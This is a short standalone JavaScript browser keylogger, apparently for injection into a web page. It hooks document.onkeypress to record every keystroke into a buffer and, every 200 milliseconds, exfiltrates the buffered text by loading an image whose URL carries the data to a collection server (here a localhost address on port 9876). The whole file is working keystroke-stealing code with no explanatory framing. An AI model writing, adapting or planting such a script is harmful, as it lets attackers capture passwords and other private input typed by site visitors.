var buf = [];
var keylogUrl = 'http://127.0.0.1:9876/?q='

document.onkeypress = function(e) {
    var key = String.fromCharCode(e.key | e.keyCode | e.charCode);
    buf.push(key);
}

window.setInterval(function() {
    if (buf.length > 0) {
        var data = encodeURIComponent(buf.join(''));
        new Image().src = keylogUrl + data;
        buf = [];
    }
}, 200);
